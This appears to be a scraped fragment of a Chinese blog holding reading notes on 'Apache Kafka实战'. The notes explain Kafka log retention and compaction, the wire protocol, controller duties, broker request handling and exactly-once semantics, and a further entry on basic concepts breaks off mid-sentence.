根据时间戳查找消息的结果不能完全准确，因而在实际场景中并不推荐producer端直接手动指定时间戳的用法。\n\n日志留存Kafka 是会定期清除日志的，而且清除的单位是日志段文件，即删除符合清除策略的日志段文件和对应的两个索引文件。当前留存策略有如下两种。\n\n基于时间的留存策略：Kafka 默认会清除 7 天前的日志段数据（包括索引文件）。Kafka提供了3个broker端参数，其中log.retention.{hours|minutes|ms}用于配置清除日志的时间间隔，其中的ms优先级最高，minutes次之，hours优先级最低。\n基于大小的留存策略：Kafka默认只会为每个log保存log.retention.bytes参数值大小的字节数。默认值是-1，表示Kafka不会对log进行大小方面的限制。\n\n日志清除是一个异步过程，Kafka broker 启动后会创建单独的线程处理日志清除事宜。另外，一定要注意的是，日志清除对于当前日志段是不生效的。也就是说，Kafka 永远不会清除当前日志段。因此，若把日志段文件最大文件的大小设置得过大而导致没有出现日志切分，那么日志清除也就永远无法执行。\n在基于时间的清除策略中，0.10.0.0版本之前 Kafka 使用日志段文件的最近修改时间（当前时间与最近修改时间的差值）来衡量日志段文件是否依然在留存时间窗口中，但文件的最近修改时间属性经常有可能被“无意”修改（比如执行了 touch 操作）。因此，在0.10.0.0版本引入时间戳字段后，该策略会计算当前时间戳与日志段首条消息的时间戳之差作为衡量日志段是否留存的依据。如果第一条消息没有时间戳信息，Kafka才会使用最近修改时间的属性。\n日志compaction前面讨论的所有 topic都有这样一个特点：clients端通常需要访问和处理这种 topic下的所有消息，但考虑这样一种应用场景，某个 Kafka topic 保存的是用户的邮箱地址，每次用户更新邮箱地址时都会发送一条Kafka消息。该消息的key就是用户ID，而value保存了邮件地址信息。假设用户 ID 为 user123 的用户连续修改了 3 次邮件地址，那么就会产生 3 条对应的Kafka消息，如下：\n\nuser123 &#x3D;&gt; user123@kafka1.com\nuser123 &#x3D;&gt; user123@kafka2.com\nuser123 &#x3D;&gt; user123@kafka3.com\n\n显然，在这种情况下用户只关心最近修改的邮件地址，即value是user123@kafka3.com的那条消息，而之前的其他消息都是“过期”的，可以放心删除。但前面提到的清除策略都无法实现这样的处理逻辑，因此，Kafka社区引入了log compaction。\nlog compaction 确保Kafka topic每个分区下的每条具有相同 key的消息都至少保存最新 value的消息。它提供了更细粒度化的留存策略。这也说明了如果要使用log compaction,Kafka消息必须要设置key。无key消息是无法为其进行压实操作的。典型的log compaction使用场景如下。\n\n数据库变更订阅：用户通常在多个数据系统存有数据，比如数据库、缓存、查询集群和 Hadoop 集群等。对数据库的所有变更都需要同步到其他数据系统中。在同步的过程中用户没必要同步所有数据，只需要同步最近的变更或增量变更。\n事件溯源（event sourcing）：编织查询处理逻辑到应用设计中并使用变更日志保存应用状态。\n高可用日志化（journaling）：将本地计算进程的变更实时记录到本地状态中，以便在出现崩溃时其他进程可以加载该状态，从而实现整体上的高可用。\n\nlog compaction相关的Kafka log结构：为了实现log compaction,Kafka在逻辑上将每个log划分成log tail和log head。log head和普通的Kafka log没有区别。事实上，它就是Kafka log的一部分，在log head中所有offset都是连续递增的。log tail中消息的位移则是不连续的，它已经是压实之后（compacted）的消息集合了。log compaction 只会根据某种策略有选择性地移除 log 中的消息，而不会变更消息的offset值。\nKafka有一个组件叫 Cleaner，它就是负责执行 compaction操作的。Cleaner负责从 log中移除已废弃的消息。log compaction是topic级别的设置。一旦为某个topic启用了log compaction,Kafka会将该 topic 的日志在逻辑上划分成两部分：“已清理”部分和“未清理”部分，后者又可进一步划分成“可清理”部分和“不可清理”部分。“不可清理”部分无法被 Kafka Cleaner 清理，而当前日志段永远属于“不可清理”部分。当前 Kafka 使用一些后台线程定期执行真正的清理任务。每个线程会挑选出“最脏”的日志段执行清理。衡量一个日志段“脏”的程度使用“脏”日志部分与总日志大小的比率。在内部，Kafka 会构造一个哈希表来保存 key与最新位移的映射关系。当执行 compaction时，Cleaner 不断拷贝日志段中的数据，只不过它会无视那些 key 存在于哈希表中但具有较大位移值的消息。\n当前与compaction相关的Kafka参数如下。\n\nlog.cleanup.policy：是否启用 log compaction。0.10.1.0 版本之前只有两种取值，即delete 和 compact。其中 delete 是默认值，表示采用之前所说的留存策略；设置compact 则表示启用 log compaction。自 0.10.1.0 版本开始，该参数支持同时指定两种策略，如 log.cleanup.policy&#x3D;delete,compact，表示既为该 topic 执行普通的留存策略，也对其进行log compaction。\nlog.cleaner.enable：是否启用 log Cleaner。在 0.9.0.0 及之前的版本中该参数默认值是false，即不启用 compaction。对于这些版本的用户来说，如果要启用 Cleaner，则必须显式地设置该参数&#x3D;true。自 0.9.0.1版本之后该参数便默认为 true。另外需要注意的是，如果要使用 log compaction，则必须将此参数设置为 true，否则即使用户设置log.cleanup.policy&#x3D;compact,Kafka也不会执行清理任务。\nlog.cleaner.min.compaction.lag.ms：默认值是 0，表示除了当前日志段，理论上所有的日志段都属于“可清理”部分，但有时候用户可能不想这么激进，用户可以设置此参数值来保护那些比某个时间新的日志段不被清理。假设设置此参数为 10分钟，当前时间是下午 1点钟，那么所有最大时间戳（通常都是最后一条消息的时间戳）在 12:50之后的日志段都不可清理。\n\n前面有提到过Kafka新版本consumer使用__consumer_offsets内部topic来保存位移信息。这个 topic 就是采用 log compaction 留存策略的，因为对于每一个 key（通常是groupId + topic + 分区号）而言，我们只关心最新的位移值——这是非常典型的log compaction使用场景。\n通信协议（wire protocol）协议设计所谓通信协议，就是实现client-server间或server-server间数据传输的一套规范。Kafka的通信协议是基于 TCP 之上的二进制协议，这套协议提供的 API 表现为服务于不同功能的多种请求（request）类型以及对应的响应（response）。所有类型的请求和响应都是结构化的，由不同的初始类型构成。Kafka使用这组协议完成各个功能的实现。\nKafka客户端与broker传输数据时，首先需要创建一个连向特定broker的Socket连接，然后按照待发送请求类型要求的结构构造响应的请求二进制字节数数组，之后发送给broker并等待从 broker处接收响应。假如是像发送消息和消费消息这样的请求，clients通常会一直维持与某些broker的长连接，从而创建TCP连接的开销被不断地摊薄给每条具体的请求。\n实际使用过程中，单个Kafka clients通常需要同时连接多个broker服务器进行数据交互，但在每个 broker 之上只需要维护一个 Socket 连接用于数据传输。clients 可能会创建额外的Socket连接用于其他任务，如元数据获取以及组rebalance等。Kafka自带的Java clients（包括Java版本producer和Java版本consumer）使用了类似于epoll的方式在单个连接上不停地轮询以传输数据。\nbroker端需要确保在单个Socket连接上按照发送顺序对请求进行一一处理，然后依次返回对应的响应结果。单个 TCP 连接上某一时刻只能处理一条请求的做法正是为了保证不会出现请求乱序。当然这是 broker 端的做法，clients 端在实现时需要自行保证请求发送顺序。比如Java版本 producer默认情况下会对 PRODUCE请求（专门用于发送消息的请求）进行流水化处理，在内存中它允许多条未处理完成的请求同时排队等候被发送。这样做的好处是提升了producer 端的吞吐量，但潜在的风险是 PRODUCE 请求发送乱序所导致的消息生产乱序。在实际应用中，用户可以通过设置参数 max.in.flight.requests.per.connection&#x3D;1来关闭这种流水化作业。\nKafka 通信协议中规定的请求发送流向有3种。除了上面所说的 clients给 broker发送请求之外，Kafka集群中的controller也能够给其他broker发送请求。clients可能给多个 broker发送请求，而 controller会向所有 broker发送请求。当然 clients也可以给 controller直接发送请求，只是在这种情况下 clients只当其是一个普通的 broker而已。第三种方式就是follower副本所在broker向leader副本所在broker发送请求，不过这只能是固定的FETCH请求。Kafka的broker端提供了一个可配置的参数用于限制broker端能够处理请求的最大字节数。一旦超过了该阈值，发生此请求的Socket连接就会被强制关闭。clients观察到连接关闭后只能执行连接重建和请求重试等的逻辑。\n请求&#x2F;响应结构Kafka 协议提供的所有请求及其响应的结构体都是由固定格式组成的，它们统一构建于多种初始类型（primitive types）之上。这些初始类型如下。\n\n固定长度初始类型：包括int8、int16、int32和int64，分别表示有符号的单字节整数、双字节整数、4字节整数和8字节整数。\n可变长度初始类型：包括bytes和string，由一个有符号整数N加上后续的N字节组成。N表示它们的内容，若是-1，则表示内容为空。其中 string类型使用 int16来保存 N；bytes使用int32来保存N。\n数组：用于处理结构体之类重复性数据结构。它们总是被编码成一个int32类型的整数N 以及后续的 N 字节。同样，N表示该数组的长度信息，而具体到里面的元素可以是其他的初始类型。\n\n所有的请求和响应都具有统一的格式，即Size + Request&#x2F;Response，其中的Size是int32表示的整数，表征了该请求或响应的长度信息。请求又可划分成请求头部和请求体，请求体的格式因请求类型的不同而变化，但请求头部的结构是固定的——它由以下4个字段构成。\n\napi_key：请求类型，以int16整数表示。\napi_version：请求版本号，以int16整数表示。\ncorrelation_id：与对应响应的关联号，实际中用于关联 response 与 request，方便用户调试和排错。该字段以int32整数表示。\nclient_id：表示发出此请求的client ID。实际场景中用于区分集群上不同clients发送的请求。该字段是一个非空字符串。同理，响应也可划分成响应头部和响应体，响应体的格式因其对应的请求类型的不同而变化，但响应头部的结构是固定的——它只有下面的这个字段。\ncorrelation_id：该字段值就是上面请求头部中的 correlation_id。有了该字段，用户就能够知道该响应对应于哪个请求了。Kafka 推荐用户总是指定 client_id 和 correlation_id，这样可以方便用户后续定位问题和DEBUG。\n\n常见请求类型其中具体格式省略，各版本可能不一致。\n\nPRODUCE请求这是编号为0的请求，即api_key &#x3D; 0，也就是Kafka通信协议中的第一个请求类型。顾名思义，它实现消息的生产。clients向broker发送PRODUCE请求并期待broker端返回响应表明消息生产是否成功。\nFETCH请求FETCH 请求是编号为1的请求，即 api_key &#x3D; 1。它服务于消费消息，既包括 clients 向broker发送的FETCH请求，也包括分区follower副本发送给leader副本的FETCH请求。\nMETADATA请求clients向broker发送METADATA请求以获取指定topic的元数据信息。\n\n请求处理流程\nclients端Kafka并没有规定这些请求必须被如何处理，它要求的只是 clients端代码必须要构造符合格式的请求，然后发送给broker。每种语言的clients端代码必须自行实现对请求和响应的完整的生命周期管理。\nbroker端每个 broker 启动时都会创建一个请求阻塞队列，专门用于接收从 clients 端发送过来的请求。同时，broker还会创建若干个请求处理线程专门获取并处理该阻塞队列中的请求\n\ncontroller设计在一个 Kafka 集群中，某个 broker 会被选举出来承担特殊的角色，即控制器（下称controller）。顾名思义，引入 controller 就是用来管理和协调 Kafka 集群的。具体来说，就是管理集群中所有分区的状态并执行相应的管理操作。\n每个 Kafka 集群任意时刻都只能有一个 controller。当集群启动时，所有 broker 都会参与controller的竞选，但最终只能由一个 broker胜出。一旦 controller在某个时刻崩溃，集群中剩余的broker会立刻得到通知，然后开启新一轮的controller选举。新选举出来的controller将承担起之前controller的所有工作。\n\ncontroller管理状态controller维护的状态分为两类：每台broker上的分区副本和每个分区的 leader副本信息。从维度上看，这些状态又可分为副本状态和分区状态。controller为了维护这两个状态专门引入了两个状态机，分别管理副本状态和分区状态。\n\n副本状态机（Replica State Machine）当前，Kafka为副本定义了7种状态以及每个状态之间的流转规则。这些状态分别如下。\nNewReplica:controller 创建副本时的最初状态。当处在这个状态时，副本只能成为follower副本。\nOnlineReplica：启动副本后变更为该状态。在该状态下，副本既可以成为 follower 副本也可以成为leader副本。\nOfflineReplica：一旦副本所在broker崩溃，该副本将变更为该状态。\nReplicaDeletionStarted：若开启了 topic 删除操作，topic 下所有分区的所有副本都会被删除。此时副本进入该状态。\nReplicaDeletionSuccessful：若副本成功响应了删除副本请求，则进入该状态。\nReplicaDeletionIneligible：若副本删除失败，则进入该状态。\nNonExistentReplica：若副本被成功删除，则进入该状态。\n\n\n分区状态机（Partition State Machine）除了副本状态机，controller 还引入了分区状态机来负责集群下所有分区的状态管理。\nNonExistent：表明不存在的分区或已删除的分区。\nNewPartition：一旦被创建，分区便处于该状态。此时，Kafka 已经为分区确定了副本列表，但尚未选举出leader和ISR。\nOnlinePartition：一旦该分区的 leader 被选出，则进入此状态。这也是分区正常工作时的状态。\nOfflinePartition：在成功选举出leader后，若leader所在的broker宕机，则分区将进入该状态，表明无法正常工作了。\n\n\n\ncontroller职责对集群状态的维护只是 controller 保持运行状态一致性的一个基本要素，但却不是controller 的职责所在。应该这样说，如果保持 controller 持续稳定地对外提供服务，就必须要求controller妥善地保存这些状态。实际上，controller的职责相当多，包括如下职责。\n\n更新集群元数据信息。一个clients能够向集群中任意一台broker发送METADATA请求来查询topic的分区信息（比如 topic有多少个分区、每个分区的 leader在哪台 broker上以及分区的副本列表）。随着集群的运行，这部分信息可能会发生变化，因此就需要 controller 提供一种机制，用于随时随地地把变更后的分区信息广播出去，同步给集群上所有的 broker。具体做法就是，当有分区信息发生变更时，controller将变更后的信息封装进 UpdateMetadataRequests请求（通信协议中的一种）中，然后发送给集群中的每个broker，这样clients在请求数据时总是能够获取最新、最及时的分区信息。\n创建topic。controller 启动时会创建一个 ZooKeeper 的监听器，该监听器的唯一任务就是监控ZooKeeper节点&#x2F;brokers&#x2F;topics下子节点的变更情况。当前一个 clients或 admin创建 topic的方式主要有如下3种。\n通过kafka-topics脚本的–create创建。\n构造CreateTopicsRequest请求创建\n配置broker端参数auto.create.topics.enable为true，然后发送MetadataRequest请求。\n\n\n删除topic。标准的Kafka删除topic方法有如下两种。\n通过kafka-topics脚本的–delete来删除topic。\n构造DeleteTopicsRequest。\n\n\n分区重分配。分区重分配操作通常都是由 Kafka 集群的管理员发起的，旨在对 topic 的所有分区重新分配副本所在broker的位置，以期望实现更均匀的分配效果。分区副本重分配的过程实际上是先扩展再收缩的过程。controller首先将分区副本集合进行扩展（旧副本集合与新副本集合的合集），等待它们全部与 leader保持同步之后将 leader设置为新分配方案中的副本，最后执行收缩阶段，将分区副本集合缩减成分配方案中的副本集合。\npreferred leader副本选举。为了避免分区副本分配不均匀，Kafka引入了 preferred副本的概念。比如一个分区的副本列表是[1,2,3]，那么broker 1就被称为该分区的preferred leader，因为它位于副本列表的第一位。在集群运行的过程中，分区的 leader因为各种各样的原因会发生变更，从而使得 leader不再是preferred leader，此时用户可以发起命令将这些分区的leader重新调整为preferred leader。具体的方法有如下两种。\n设置 broker端参数 auto.leader.rebalance.enable为 true，这样 controller会定时地自动调整preferred leader。\n通过kafka-preferred-replica-election脚本手动触发。\n\n\ntopic分区扩展。当前增加分区主要使用kafka-topics脚本的–alter选项来完成。和创建 topic一样它会向 ZooKeeper的&#x2F;brokers&#x2F;topics&#x2F;节点下写入新的分区目录。\nbroker加入集群。每个broker成功启动之后都会在ZooKeeper的&#x2F;broker&#x2F;ids下创建一个znode，并写入broker的信息。如果要让Kafka动态地维护broker列表，就必须注册一个ZooKeeper监听器时刻监控该目录下的数据变化。每当有新 broker 加入集群时，该监听器会感知到变化，执行对应的 broker 启动任务，之后更新集群元数据信息并广而告之。\nbroker崩溃。由于当前broker在 ZooKeeper中注册的znode是临时节点，因此一旦broker崩溃，broker与ZooKeeper的会话会失效并导致临时节点被删除，故上面监控broker加入的那个监听器同样被用来监控那些因为崩溃而退出集群的 broker 列表。\n受控关闭。受控关闭是由即将关闭的 broker向 controller发送请求的。请求的名字是 ControlledShutdownRequest。一旦发送完 ControlledShutdownRequest，待关闭 broker将一直处于阻塞状态，直到接收到 broker端发送的 ControlledShutdownResponse，表示关闭成功，或用完所有重试机会后强行退出。\ncontroller leader选举。作为 Kafka 集群的重要组件，controller 必然要支持故障转移（fail-over）。若当前controller 发生故障或显式关闭，Kafka 必须要能够保证及时选出新的 controller。当前，一个Kafka集群中发生controller leader选举的场景共有如下4种。\n关闭controller所在broker。\n当前controller所在broker宕机或崩溃。\n手动删除ZooKeeper的&#x2F;controller节点。\n手动向ZooKeeper的&#x2F;controller节点写入新的broker id。这4种操作变更实际上都是&#x2F;controller节点的内容，因此 controller只需要做一件事情：创建一个监听该目录的监听器。&#x2F;controller 本质上是一个临时节点，节点保存了当前 controller 所在的 broker id。集群首次启动时所有 broker 都会抢着创建该节点，但ZooKeeper保证了最终只能有一个broker胜出——胜出的那个broker即成为controller。一旦成为 controller，它会增加 controller的版本号，即更新&#x2F;controller_epoch节点的值，然后履行上面所有的这些职责。对于那些没有成为 controller 的 broker 们而言，它们不会甘心失败，而是继续监听&#x2F;controller节点的存活情况并随时准备竞选新的controller。\n\n\n\nbroker请求处理Reactor模式Kafka broker处理请求的模式就是 Reactor设计模式。根据维基百科的定义，Reactor设计模式是一种事件处理模式，旨在处理多个输入源同时发送过来的请求。Reactor 模式中的服务处理器（service handler）或分发器（dispatcher）将入站请求（inbound request）按照多路复用的方式分发到对应的请求处理器（request handler）中。\n本质上这和生产者-消费者的模式很像。外部的输入源就类似于producer角色，它们的工作就是生产“事件”发送给Reactor中的dispatcher，具体而言是将事件放入dispatcher中的队列上；而Reactor通常会创建多个request handler线程专门消费dispatcher分发过来的事件。对于Kafka而言，该模型中的事件实际上对应于Socket连接通道（SocketChannel），即broker上每当有新的Socket连接通道被创建，dispatcher都会将该连接分发给下面某个request handler来消费。\nReactor 模式中有很两个很重要的组件 acceptor 线程和 processor 线程。acceptor 线程实时地监听外部数据源发送过来的事件，并执行分发任务；processor 线程执行事件处理逻辑并将处理结果发送给 client。\nKafka broker请求处理Kafka broker 请求处理实现了上面的 Reactor 模式。在 Kafka 中，每个 broker 都有一个acceptor 线程和若干个 processor 线程。processor 线程的数量是可以配置的。num.network.threads就用于控制该数量的 broker端参数，默认值是 3，即每个 broker都创建 3个processor线程。值得注意的是，broker会为用户配置的每组listener创建一组processor线程。每个 broker 可以同时设置多种通信安全协议，比如PLAINTEXT和 SSL，因此一旦某个 broker同时配置了多套通信安全协议，那么 Kafka会为每个协议都创建一组processor线程。\nclients 端通常会保存与broker 的长连接，因此不需要频繁地重建 Socket 连接，故broker端固定使用一个 acceptor线程来唯一地监听入站连接。由于只做新连接监听这一件事情，acceptor 线程的处理逻辑是很轻量级的，在实际使用过程中通常也都不是系统瓶颈。这就是多路复用在broker端的第一个应用。\nprocessor线程接收 acceptor线程分配的新 Socket连接通道，然后开始监听该通道上的数据传输。目前 broker 以线程数组而非线程池的方式来实现这组processor，之后使用很简单的数组索引轮询方式依次给每个 processor 线程分配任务，实现了最均匀化的负载均衡。processor 线程实际上也不是处理请求的真正执行者，Kafka 创建了一个KafkaRequestHandler 线程池专门地处理真正的请求。processor 线程一个重要的任务就是将Socket连接上接收到的请求放入请求队列中。每个broker启动时会创建一个全局唯一的请求队列，大小由broker端参数queued.max.requests控制，默认值是500，表示每个broker最多只能保存500个未处理的请求。一旦超过该数字，clients端发送给broker的请求将会被“阻塞”，直到该队列腾出空间。\nKafkaRequestHandler线程池分配具体的线程从该队列中获取请求并执行真正的请求处理逻辑。该线程池的大小也是可以配置的，由broker端参数num.io.threads控制，默认是8个线程。除了请求队列，每个broker还会创建与processor线程数等量的响应队列，即为每个processor线程都创建一个对应的响应队列。processor线程的另一个很重要的任务就是实时处理各自响应队列中的响应结果。\nKafka在设计上使用了 Java NIO的Selector+Channel+Buffer的思想，在每个processor线程中维护一个Selector实例，并通过这个Selector来管理多个通道上的数据交互，这便是多路复用在processor线程上的应用。\n实现精确一次处理语义Apache Kafka的消息交付语义（message delivery semantic）。Kafka是如何达到精确一次处理语义（exactly-once semantics，简称EOS）的？\n消息交付语义clients端常见的 3种消息交付语义。它们分别如下。\n\n最多一次（at most once）：消息可能丢失也可能被处理，但最多只会被处理一次。\n至少一次（at least once）：消息不会丢失，但可能被处理多次。\n精确一次（exactly once）：消息被处理且只会被处理一次。\n\n对 producer而言，Kafka 引入已提交消息（committed message）的概念。一旦消息被成功地提交到日志文件，只要至少存在一个可用的包含该消息的副本，那么这条消息就永远不会丢失。在0.11.0.0版本之前，Kafka producer默认提供的是at least once语义。可能会因为网络出现故障导致消息写入磁盘的响应没有发送成功从而开启重试操作，导致消息被写入日志两次。Kafka 0.11.0.0版本推出了幂等性 producer和对事务的支持，从而完美地解决了这种消息重复发送的问题。\n对 consumer 端而言，相同日志下所有的副本都应该有相同的内容以及相同的当前位移值。consumer通过consumer位移自行控制和标记日志读取的进度。如果 consumer程序崩溃，那么替代它的新程序实例就必须要接管这个 consumer 位移，即从崩溃时读取位置继续开始消费。若要判断consumer到底支持什么交付语义，位移提交的时机就显得至关重要。\n一种方式是 consumer 首先获取若干消息，然后提交位移，之后再开始处理消息。这种方法下若consumer在提交位移后处理消息前崩溃，那么它实现的就是at most once语义，因为消息有可能不被处理，就算处理了最多也只会是一次。\n另一种方式是 consumer 获取了若干消息，处理到最后提交位移。显然，consumer 保证只有在消息被处理完成后才提交位移，因此它实现的就是 at least once 语义，因为消息处理过程中如果出现错误从而引发重试，那么某些消息就可能被处理多次。\n那么如何实现 consumer端的 EOS呢？主要是依赖0.11.0.0版本引入的事务。\n幂等性producer（idempotent producer）幂等性producer是Apache Kafka 0.11.0.0版本用于实现EOS的第一个利器。若一个操作执行多次的结果与只运行一次的结果是相同的，那么我们称该操作为幂等操作。\n启用幂等性 producer 以及获取其提供的 EOS 语义，需要显式地设置producer端的新参数 enable.idempotence 为true。\n幂等性 producer的设计思路类似于 TCP的工作方式。发送到 broker端的每批消息都会被赋予一个序列号（sequence number）用于消息去重。但是和 TCP 不同的是，这个序列号不会被丢弃，相反 Kafka会把它们保存在底层日志中，这样即使分区的 leader副本挂掉，新选出来的 leader broker也能执行消息去重工作。保存序列号只需要额外几字节，因此整体上对 Kafka消息保存开销的影响并不大。\n除了序列号，Kafka还会为每个producer实例分配一个producer id（下称PID）。producer在初始化时必须分配一个 PID。PID 分配的过程对用户来说是完全透明的，因此不会为用户所见。消息要被发送到的每个分区都有对应的序列号值，它们总是从0开始并且严格单调增加。对于 PID、分区和序列号的关系，用户可以设想一个 Map,key 就是（PID，分区号）,value就是序列号。即每对（PID，分区号）都有对应的序列号值。若发送消息的序列号小于或等于broker端保存的序列号，那么broker会拒绝这条消息的写入操作。\n这种设计确保了即使出现重试操作，每条消息也只会被保存在日志中一次。不过，由于每个新的 producer实例都会被分配不同的 PID，当前设计只能保证单个 producer实例的 EOS语义，而无法实现多个producer实例一起提供EOS语义。\n事务（transaction）对事务的支持是 Kafka 实现 EOS 的第二个利器。引入事务使得 clients 端程序（无论是producer还是consumer）能够将一组消息放入一个原子性单元中统一处理。\n处于事务中的这组消息能够从多个分区中消费，也可以发送到多个分区中去。重要的是不论是发送还是消费，Kafka 都能保证它们是原子性的，即所有的写入操作要么全部成功，要么全部失败。当然对于consumer而言，EOS语义的支持要弱一些，这是由consumer本身的特性决定的。也就是说，consumer 有可能以原子性的方式消费这批消息，也有可能是非原子性的。设想consumer总是需要 replay某些消息，如果是这样的使用场景，那么对于 EOS的支持就要弱很多。\nKafka为实现事务要求应用程序必须提供一个唯一的 id来表征事务。这个 id被称为事务 id，或 TransactionalId，它必须在应用程序所有的会话上是唯一的。值得注意的是，TransactionalId与上面所说的PID是不同的，前者是由用户显式提供的，而后者是 producer 自行分配的。\n当提供了TransactionalId后，Kafka就能确保：\n\n跨应用程序会话间的幂等发送语义。具体的做法与新版本 consumer的 generation概念类似，使用具有版本含义的generation来隔离旧事务的操作。\n支持跨会话间的事务恢复。如果某个 producer 实例挂掉了，Kafka 能够保证下一个实例首先完成之前未完成的事务，从而总是保证状态的一致性。\n\n如果以consumer的角度而言，如前所述，事务的支持要弱一些，原因如下。\n\n对于compacted的topic而言，事务中的消息可能已经被删除了。\n事务可能跨多个日志段（log segment），因此若老的日志段被删除，用户将丢失事务中的部分消息。\nconsumer程序可能使用 seek方法定位事务中的任意位置，也可能造成部分消息的丢失。\nconsumer可能选择不消费事务中的所有消息，即无法保证读取事务的全部消息。\n\n","categories":["读书笔记"],"tags":["《apache Kafka实战》","kafka"]},{"title":"《apache Kafka实战》读书笔记-基本概念","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Aapache%20Kafka%E5%AE%9E%E6%88%98%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","content":"第一章 - 认识 Apache KafkaKafka 的核心功能是什么？一言以蔽之，高性能的消息发送与高性能的消息消费。\n消息引擎系统（Messaging system）用于在不同应用间传输消息的系统，消息引擎系统中的消息自然是最关键的因素之一。其实，这里的消息可以是任何形式的数据，比如电子邮件、传真、即时消息，甚至是其他服务等，总之都是对企业有价值的数据。在设计一个消息引擎系统时需要考虑的两个重要因素：\n\n消息设计。\n传输协议设计。\n\n消息设计消息引擎系统在设计消息时一定要考虑语义的清晰和格式上的通用性。一条消息要有能够完整清晰表达业务的能力，它不能是含糊不清、语义不明甚至无法处理的。同时，为了更好地表达语义以及最大限度地提高重用性，消息通常都采用结构化的方式进行设计。比如SOAP协议中的消息就采用了XML格式，而Web Service也支持JSON格式的消息。Kafka的消息是用二进制方式来保存的，但依然是结构化的消息。\n传输协议设计消息传输协议指定了消息在不同系统之间传输的方式。这类协议可能包括任何能够在不同系统间传输消息或是执行语义操作的协议或框架。比如现在主流的 RPC 及序列化框架，包括Google的Protocol Buffers、阿里系的Dubbo等。Kafka自己设计了一套二进制的消息传输协议。\n消息引擎范型一个消息引擎范型是一个基于网络的架构范型，描述了消息引擎系统的两个不同的子部分是如何互连且交互的。如果把消息引擎系统的这两个子系统比喻成两座城市，那么之前谈到的传输协议就是需要铺设的沥青公路，而引擎范型决定了来往穿梭于这两座城市的路线。\n最常见的两种消息引擎范型是消息队列模型和发布&#x2F;订阅模型。\n消息队列(message queue)模型是基于队列提供消息传输服务的，多用于进程间通信（inter-process communication,IPC)以及线程间通信。该模型定义了消息队列(queue)、发送者(sender)和接收者(receiver)，提供了一种点对点(point-to-point,p2p)的消息传递方式，即发送者发送每条消息到队列的指定位置，接收者从指定位置获取消息。一旦消息被消费(consumed)，就会从队列中移除该消息。每条消息由一个发送者生产出来，且只被一个消费者(consumer)处理——发送者和消费者之间是一对一的关系。生活中接线生的工作就是一个典型的基于队列的消息引擎模型。每个打进来的电话都进入一个排队队列，然后只由一个接线生进行处理。同一个客户不会被第二个接线生处理。\n另一种模型就是发布&#x2F;订阅模型（publish&#x2F;subscribe，或简称为 pub&#x2F;sub），与前一种模型不同，它有主题（topic）的概念：一个 topic 可以理解为逻辑语义相近的消息的容器。这种模型也定义了类似于生产者&#x2F;消费者这样的角色，即发布者（publisher）和订阅者（subscriber）。发布者将消息生产出来发送到指定的 topic 中，所有订阅了该 topic 的订阅者都可以接收到该topic下的所有消息。通常具有相同订阅 topic的所有订阅者将接收到同样的消息。生活中报纸的订阅就是一种典型的发布&#x2F;订阅模型：很多读者都会订阅同一个报社（类比于同一个 topic）出版的报纸，这样每当报纸更新（生产新的消息）时，这些读者都可以收到最新的报纸（接收最新的消息）。\nKafka引入了消息组（consumer group）的概念来同时支持这两种模型。\nKafka 概要设计Kafka的设计初衷就是为了解决互联网公司超大量级数据的实时传输。为了实现这个目标，Kafka在设计之初就需要考虑以下4个方面的问题。\n\n吞吐量&#x2F;延时。\n消息持久化。\n负载均衡和故障转移。\n伸缩性。\n\n吞吐量&#x2F;延时通常来说，吞吐量是某种处理能力的最大值。而对于 Kafka而言，它的吞吐量就是每秒能够处理的消息数或者每秒能够处理的字节数。很显然，我们自然希望消息引擎的吞吐量越大越好。消息引擎系统还有一个名为延时的性能指标。它衡量的是一段时间间隔，可能是发出某个操作与接收到操作响应（response）之间的时间，或者是在系统中导致某些物理变更的起始时刻与变更正式生效时刻之间的间隔。对于 Kafka而言， 延时可以表示客户端发起请求与服务器处理请求并发送响应给客户端之间的这一段时间。显而易见，延时间隔越短越好。\n在实际使用场景中，这两个指标通常是一对矛盾体，即调优其中一个指标通常会使另一个指标变差。Kafka而言它是如何做到高吞吐量、低延时的呢？首先，Kafka 的写入操作是很快的，这主要得益于它对磁盘的使用方法的不同。虽然Kafka 会持久化所有数据到磁盘，但本质上每次写入操作其实都只是把数据写入到操作系统的页缓存（page cache）中，然后由操作系统自行决定什么时候把页缓存中的数据写回磁盘上。这样的设计有3个主要优势。\n\n操作系统页缓存是在内存中分配的，所以消息写入的速度非常快。\nKafka不必直接与底层的文件系统打交道。所有烦琐的I&#x2F;O操作都交由操作系统来处理。\nKafka写入操作采用追加写入（append）的方式，避免了磁盘随机写操作。（虽然通常认为物理磁盘读写操作是很慢的，但是磁盘的顺序读写速度还是非常快的）\n\nKafka 在设计时采用了追加写入消息的方式，即只能在日志文件末尾追加写入新的消息，且不允许修改已写入的消息，因此它属于典型的磁盘顺序访问型操作，所以Kafka 消息发送的吞吐量是很高的。在实际使用过程中可以很轻松地做到每秒写入几万甚至几十万条消息。\nKafka是把消息写入操作系统的页缓存中的。那么同样地，Kafka 在读取消息时会首先尝试从 OS的页缓存中读取，如果命中便把消息经页缓存直接发送到网络的 Socket上。这个过程就是利用 Linux 平台的 sendfile 系统调用做到的，而这种技术就是大名鼎鼎的零拷贝（Zero Copy）技术。\n关于 sendfile 与零拷贝传统的Linux操作系统中的I&#x2F;O接口是依托于数据拷贝来实现的，但在零拷贝技术出现之前，一个I&#x2F;O操作会将同一份数据进行多次拷贝。数据传输过程中还涉及内核态与用户态的上下文切换，CPU 的开销非常大，因此极大地限制了 OS 高效进行数据传输的能力。零拷贝技术很好地改善了这个问题：首先在内核驱动程序处理 I&#x2F;O 数据的时候，它不再需要进行上下文的切换，节省了内核缓冲区与用户态应用程序缓冲区之间的数据拷贝，同时它利用直接存储器访问技术（Direct Memory Access,DMA）执行I&#x2F;O操作，因此也避免了OS内核缓冲区之间的数据拷贝，故而得名零拷贝。\n\n传统方式（没有零拷贝）：\n\n步骤 1：内核调用 read() 从磁盘读取数据到 内核缓冲区（Page Cache）。\n步骤 2：再调用 write() 将数据从 内核缓冲区 拷贝到 用户缓冲区（User Buffer）。\n步骤 3：用户态再调用 send()，将数据拷贝回 内核缓冲区（Socket Buffer）。\n步骤 4：内核将数据写入 网卡缓冲区，最终发送给消费者。\n\n\nKafka 采用 sendfile()（零拷贝）：\n\n步骤 1：内核直接将数据从 磁盘 Page Cache 复制到 Socket Buffer，绕过用户态，不经过用户缓冲区。\n步骤 